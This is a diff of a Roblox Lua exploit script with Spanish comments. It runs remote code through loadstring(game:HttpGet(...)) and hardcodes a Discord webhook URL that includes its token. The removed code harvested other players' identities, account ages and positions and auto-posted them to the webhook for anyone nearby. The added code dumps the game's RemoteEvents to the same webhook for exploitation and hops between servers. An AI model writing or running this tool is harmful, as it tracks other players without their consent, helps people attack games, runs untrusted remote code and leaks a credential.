@@ -1,108 +1,84 @@
--- Carga la UI
+-- Librerías
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Brainrot Finder", "BloodTheme")
-local Tab = Window:NewTab("Jugadores")
-local Section = Tab:NewSection("Enviar al Webhook")
-local LoopSection = Tab:NewSection("AutoScan Cercanos")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Players = game:GetService("Players")
 
--- Webhook de Discord
+-- Configuración del Webhook
 local WEBHOOK = "https://discord.com/api/webhooks/1395188329598681330/2c5dZncIV-4rNouI7XDUVXb4yCFNIYNM3wbv3op2IPyGBcIlnZ9SG5RfBv-RBM9MNor-"
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local activeLoop = false
+-- UI
+local Window = Library.CreateLib("Finder de RemoteEvents", "BloodTheme")
+local tabEventos = Window:NewTab("RemoteEvents")
+local secEventos = tabEventos:NewSection("Listar y Enviar")
 
--- Función para obtener datos del jugador
-local function getPlayerData(player)
-    local character = player.Character
-    local pos = character and character:FindFirstChild("HumanoidRootPart") and character.HumanoidRootPart.Position or Vector3.zero
-    local team = player.Team and player.Team.Name or "Sin equipo"
-    local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
-    local health = humanoid and humanoid.Health or 0
-    local maxHealth = humanoid and humanoid.MaxHealth or 0
+local tabExtras = Window:NewTab("Extras")
+local secExtras = tabExtras:NewSection("Utilidades")
 
-    return {
-        name = player.Name,
-        userId = player.UserId,
-        accountAge = player.AccountAge,
-        health = health,
-        maxHealth = maxHealth,
-        position = tostring(pos),
-        team = team
-        -- isMobile eliminado por incompatibilidad
-    }
+-- 🧠 Función para obtener todos los RemoteEvents
+local function obtenerRemoteEventsDesde(instancia, ruta)
+    local eventos = {}
+
+    for _, hijo in ipairs(instancia:GetChildren()) do
+        local nuevaRuta = ruta .. "." .. hijo.Name
+        if hijo:IsA("RemoteEvent") then
+            table.insert(eventos, nuevaRuta)
+        elseif #hijo:GetChildren() > 0 then
+            local subEventos = obtenerRemoteEventsDesde(hijo, nuevaRuta)
+            for _, e in ipairs(subEventos) do
+                table.insert(eventos, e)
+            end
+        end
+    end
+
+    return eventos
 end
 
--- Enviar datos al webhook
-local function enviarWebhook(player)
-    local data = getPlayerData(player)
-    local embed = {
-        title = "🎯 Jugador Detectado",
-        description = string.format("**Nombre:** %s\n**UserId:** %s\n**Edad de cuenta:** %s días\n**Salud:** %.0f / %.0f\n**Equipo:** %s\n**Posición:** %s",
-            data.name, data.userId, data.accountAge, data.health, data.maxHealth, data.team, data.position),
-        color = 16711680,
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+-- 📤 Enviar RemoteEvents al Webhook
+local function enviarRemoteEvents()
+    local eventos = obtenerRemoteEventsDesde(game.ReplicatedStorage, "ReplicatedStorage")
+
+    local contenido = table.concat(eventos, "\n")
+    local data = {
+        username = "RemoteEvent Finder",
+        content = "📡 Lista de RemoteEvents detectados:\n```lua\n" .. contenido .. "\n```"
     }
 
-    local jsonData = HttpService:JSONEncode({
-        username = "Finder Bot",
-        embeds = {embed}
-    })
+    local jsonData = HttpService:JSONEncode(data)
 
     local success, err = pcall(function()
         HttpService:PostAsync(WEBHOOK, jsonData, Enum.HttpContentType.ApplicationJson)
     end)
 
-    if not success then
-        warn("❌ Error al enviar webhook: ", err)
+    if success then
+        print("✅ Dump enviado correctamente.")
+    else
+        warn("❌ Error al enviar Webhook:", err)
     end
 end
 
--- Agrega botón individual por jugador
-local function addPlayerButton(player)
-    if player ~= LocalPlayer then
-        Section:NewButton("Enviar: " .. player.Name, "Mandar datos a Discord", function()
-            enviarWebhook(player)
-        end)
-    end
-end
+-- Botón para listar y enviar eventos
+secEventos:NewButton("📤 Enviar RemoteEvents", "Busca todos los RemoteEvents y los manda al Webhook", function()
+    enviarRemoteEvents()
+end)
 
--- Loop automático de escaneo de jugadores cercanos
-task.spawn(function()
-    while true do
-        if activeLoop then
-            pcall(function()
-                for _, player in ipairs(Players:GetPlayers()) do
-                    if player ~= LocalPlayer and player.Character and LocalPlayer.Character then
-                        local hrp1 = player.Character:FindFirstChild("HumanoidRootPart")
-                        local hrp2 = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-                        if hrp1 and hrp2 then
-                            local dist = (hrp1.Position - hrp2.Position).Magnitude
-                            if dist <= 80 then -- Rango de detección
-                                enviarWebhook(player)
-                                task.wait(0.5)
-                            end
-                        end
-                    end
-                end
-            end)
+-- 🔄 Botón para cambiar de servidor (azul)
+secExtras:NewButton("🔄 TP a otro servidor", "Server hop", function()
+    local gameId = game.PlaceId
+
+    local servers = {}
+    local req = game:HttpGet("https://games.roblox.com/v1/games/"..gameId.."/servers/Public?sortOrder=Asc&limit=100")
+    local data = HttpService:JSONDecode(req)
+
+    for _, server in ipairs(data.data) do
+        if server.playing < server.maxPlayers and server.id ~= game.JobId then
+            table.insert(servers, server.id)
         end
-        task.wait(3)
     end
-end)
 
--- Toggle para activar/desactivar loop de escaneo
-LoopSection:NewToggle("AutoEnviar Cercanos", "Escanea y manda cada 3s a jugadores a 80 studs", function(state)
-    activeLoop = state
-end)
-
--- Botones por cada jugador al inicio
-for _, player in ipairs(Players:GetPlayers()) do
-    addPlayerButton(player)
-end
-
--- Botón para nuevos jugadores que entren
-Players.PlayerAdded:Connect(function(player)
-    addPlayerButton(player)
+    if #servers > 0 then
+        TeleportService:TeleportToPlaceInstance(gameId, servers[1], Players.LocalPlayer)
+    else
+        warn("❌ No se encontraron servidores válidos.")
+    end
 end)
